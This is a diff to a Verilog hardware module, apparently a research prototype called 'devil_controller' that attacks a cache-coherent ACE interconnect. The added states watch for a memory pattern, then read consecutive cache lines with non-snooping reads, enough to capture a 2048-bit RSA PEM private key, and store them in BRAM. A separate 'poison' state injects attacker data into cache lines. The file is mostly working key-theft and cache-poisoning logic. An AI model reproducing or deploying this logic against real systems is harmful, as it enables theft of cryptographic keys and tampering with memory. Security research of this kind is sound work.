@@ -57,6 +57,13 @@ module devil_controller#(
         input  wire                        [2:0] i_external_awsnoop_Data,
         input  wire                       [31:0] i_external_l_araddr_Data,
         input  wire                       [31:0] i_external_l_awaddr_Data,
+        input  wire                        [4:0] i_pattern_size,
+
+        // Internal Signals, from devil controller to BRAM
+        output wire                        		  o_trigger_bram_write,
+	    output wire                        [14:0] o_bram_addr,
+	    output wire    [(C_ACE_DATA_WIDTH*4)-1:0] o_bram_data,
+        input  wire                               i_bram_end,
 
         // Internal Signals, from devil controller to devil passive
         output wire   [CTRL_OUT_SIGNAL_WIDTH-1:0] o_controller_signals
@@ -68,15 +75,20 @@ module devil_controller#(
     parameter [DEVIL_STATE_SIZE-1:0]    DEVIL_IDLE              = 0,
                                         DEVIL_SEARCH_PATTERN    = 1,
                                         DEVIL_CHOOSE_CMD        = 2, 
-                                        DEVIL_LEAK_ACTION       = 3,
-                                        DEVIL_POISON_ACTION     = 4,
-                                        DEVIL_REPLY             = 5,
-                                        DEVIL_END_OP            = 6,
-                                        DEVIL_PARTIAL_MATCH     = 7,
-                                        DEVIL_READ_NEXT_CL      = 8;
+                                        DEVIL_LEAK_KEY          = 3,
+                                        DEVIL_LEAK_KEY_READ     = 4,
+                                        DEVIL_LEAK_KEY_ST_BRAM  = 5,
+                                        DEVIL_POISON_ACTION     = 6,
+                                        DEVIL_REPLY             = 7,
+                                        DEVIL_END_OP            = 8,
+                                        DEVIL_PARTIAL_MATCH     = 9,
+                                        DEVIL_READ_NEXT_CL      = 10;
 
     `define CMD_LEAK        0
     `define CMD_POISON      1
+    `define CL_LINE_BYTES   64
+    `define CL_LINE_BITS    `CL_LINE_BYTES*8 // 512 bits
+    `define PEM_SIZE        32'h6C0*8  // Number of bits to fetch -> Enough for a RSA key with 2048 bits
 
 //------------------------------------------------------------------------------
 // WIRES
@@ -108,6 +120,11 @@ module devil_controller#(
     reg                        [4:0] r_pattern_size_save;
     reg                        [3:0] r_match_offset;
     reg                              r_match_pattern_trigger;
+    reg                       [15:0] r_pem_size;
+    reg                              r_trigger_bram_write;
+    reg                       [14:0] r_bram_addr;
+    reg   [(C_ACE_DATA_WIDTH*4)-1:0] r_bram_data;
+
 
 //------------------------------------------------------------------------------
 // INPUTS/OUTPUTS
@@ -124,7 +141,7 @@ module devil_controller#(
     assign o_controller_signals[CTRL_SIGNAL6_WIDTH-1:CTRL_SIGNAL5_WIDTH]  = r_active_func;
     assign o_controller_signals[CTRL_SIGNAL7_WIDTH-1:CTRL_SIGNAL6_WIDTH]  = r_reply;
 
-    assign o_cache_line_active_devil = r_write_cache_line_active;
+    assign o_cache_line_active_devil  = r_write_cache_line_active;
     assign o_cache_line_passive_devil = r_write_cache_line_passive;
 
     assign o_internal_adl_en = r_internal_adl_en;
@@ -147,6 +164,11 @@ module devil_controller#(
     assign o_cache_line_2_monitor[31+32*13:0+32*13] = i_external_cache_line_pattern[31+32*13:0+32*13];
     assign o_cache_line_2_monitor[31+32*14:0+32*14] = i_external_cache_line_pattern[31+32*14:0+32*14];
     assign o_cache_line_2_monitor[31+32*15:0+32*15] = i_external_cache_line_pattern[31+32*15:0+32*15];
+
+    assign o_trigger_bram_write     = r_trigger_bram_write;
+    assign o_bram_addr              = r_bram_addr;
+    assign o_bram_data              = r_bram_data;
+
 //------------------------------------------------------------------------------
 // FSM
 //------------------------------------------------------------------------------
@@ -157,6 +179,9 @@ module devil_controller#(
         fsm_devil_controller <= DEVIL_IDLE;
         r_reply <= 0;
         r_pattern <= 0;
+        r_pem_size <= 0;
+        r_bram_addr <= 0;
+        r_bram_data <= 0;
         r_active_func <= 0;
         r_match_offset <= 0;
         r_pattern_size <= 0;
@@ -167,6 +192,7 @@ module devil_controller#(
         r_pattern_size_save <= 0;
         r_controller_araddr <= 0;
         r_controller_awaddr <= 0;
+        r_trigger_bram_write <= 0;
         r_controller_arsnoop <= 0;
         r_controller_awsnoop <= 0;
         r_controller_ardomain <= 0;
@@ -190,7 +216,7 @@ module devil_controller#(
                     begin 
                         r_save_cache_line <= i_cache_line_active_devil;
                         r_pattern <= i_external_cache_line_pattern;
-                        r_pattern_size <= 16;
+                        r_pattern_size <= i_pattern_size;
                         r_match_pattern_trigger <= 1;
                         if(w_op_end) begin
                             r_match_pattern_trigger <= 0;
@@ -209,7 +235,7 @@ module devil_controller#(
                     else
                         fsm_devil_controller <= fsm_devil_controller;                                               
                 end
-            DEVIL_READ_NEXT_CL: // 8
+            DEVIL_READ_NEXT_CL: // 9
                 begin 
                     // Read Snoop
                     r_controller_araddr   <= (i_acaddr_snapshot+32'h40); // next CL
@@ -232,7 +258,7 @@ module devil_controller#(
                     else
                         fsm_devil_controller <= fsm_devil_controller;                                               
                 end
-            DEVIL_PARTIAL_MATCH: // 7
+            DEVIL_PARTIAL_MATCH: // 10
                 begin 
                     // Compare the remaining pattern 
                     r_pattern <= r_pattern >> ((r_pattern_size_save-r_match_offset)*32);
@@ -253,7 +279,7 @@ module devil_controller#(
                     case (i_cmd[3:0])
                         `CMD_LEAK  : 
                         begin
-                            fsm_devil_controller <= DEVIL_LEAK_ACTION;
+                            fsm_devil_controller <= DEVIL_LEAK_KEY;
                         end
                         `CMD_POISON  : 
                         begin
@@ -262,30 +288,65 @@ module devil_controller#(
                         default : fsm_devil_controller <= DEVIL_END_OP; 
                     endcase                                                      
                 end
-            DEVIL_LEAK_ACTION:  // 3 (Don't Tested!!)
+            DEVIL_LEAK_KEY: // 3
                 begin 
-
-                    // Read Snoop
-                    r_controller_araddr   <= i_external_l_araddr_Data;
-                    r_controller_arsnoop  <= i_external_arsnoop_Data; // READ_ONCE
-                    r_controller_ardomain <= 2'b10; // outer shareable
+                    if(r_pem_size == 0) 
+                    begin 
+                        r_pem_size <= `CL_LINE_BITS;
+                        r_controller_araddr <= i_acaddr_snapshot;
+                        fsm_devil_controller <= DEVIL_LEAK_KEY_READ;  
+                        r_bram_addr <= 0; // BRAM Initial Address                                          
+                    end
+                    else 
+                    begin
+                        if(r_pem_size <= `PEM_SIZE) 
+                        begin
+                            r_pem_size <= r_pem_size + `CL_LINE_BITS;
+                            r_controller_araddr <= r_controller_araddr + `CL_LINE_BYTES; // next CL
+                            fsm_devil_controller <= DEVIL_LEAK_KEY_READ;                                           
+                        end
+                        else 
+                        begin
+                            r_pem_size <= 0;
+                            fsm_devil_controller <= DEVIL_REPLY; 
+                        end     
+                    end                                                
+                end
+            DEVIL_LEAK_KEY_READ: //4
+                begin 
+                    // ReadNoSnoop , ardomain = 2'b00 and arsnoop = 4'b0000
+                    r_controller_ardomain <= 2'b00;
+                    r_controller_arsnoop  <= 4'b0000;
 
                     // trigger read snoop
-                    r_active_func <= `ADL; // Write Snoop
+                    r_active_func <= `ADL; // Read Snoop
 
                     // Enable Read Snoop
                     r_internal_adl_en <= 1; 
                     r_trigger_active <= 1;
-   
-                    if(i_end_active_devil & r_trigger_active) begin
-                        fsm_devil_controller <= DEVIL_REPLY; 
+
+                     if(i_end_active_devil & r_trigger_active) begin
+                        fsm_devil_controller <= DEVIL_LEAK_KEY_ST_BRAM;     
                         r_internal_adl_en <= 0; 
                         r_trigger_active  <= 0;
                     end
                     else
-                        fsm_devil_controller <= fsm_devil_controller;                                           
+                        fsm_devil_controller <= fsm_devil_controller;                                       
                 end
-            DEVIL_POISON_ACTION:  // 4
+            DEVIL_LEAK_KEY_ST_BRAM: // 5
+                begin 
+                    r_trigger_bram_write <= 1;
+                    r_bram_data <= i_cache_line_active_devil;
+
+                    if(i_bram_end) begin
+                        r_trigger_bram_write <= 0;
+                        r_bram_addr <= r_bram_addr + 64; // cache line size
+                        fsm_devil_controller <= DEVIL_LEAK_KEY;     
+                    end
+                    else
+                        fsm_devil_controller <= fsm_devil_controller;                                       
+                end
+            DEVIL_POISON_ACTION:  // 6
                 begin 
                     // Write Snoop Data
                     r_write_cache_line_active <= i_external_cache_line;  // (just to test)
@@ -309,7 +370,7 @@ module devil_controller#(
                     else
                         fsm_devil_controller <= fsm_devil_controller;                                                
                 end
-            DEVIL_REPLY:  // 5
+            DEVIL_REPLY:  // 7
                 begin 
                     r_trigger_active <=  0;
                     r_internal_adt_en <= 0;
@@ -321,7 +382,7 @@ module devil_controller#(
                     else
                         fsm_devil_controller <= fsm_devil_controller;                                               
                 end
-            DEVIL_END_OP:  // 6
+            DEVIL_END_OP:  // 8
                 begin 
                     r_reply <= 0;
                     fsm_devil_controller <= DEVIL_IDLE;                                                  
